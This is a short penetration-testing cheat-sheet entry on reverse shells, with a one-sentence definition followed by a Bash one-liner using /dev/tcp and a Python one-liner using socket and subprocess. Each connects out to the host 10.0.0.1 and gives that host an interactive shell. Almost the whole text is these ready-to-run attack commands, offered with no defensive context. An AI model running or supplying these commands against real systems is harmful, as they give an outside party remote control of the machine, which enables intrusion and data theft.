0x01 - Reverse Shell

A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the local host.



Bash

Id 
pentest@x65[/home]$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1


Python

Id 
pentest@x65[/home]$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
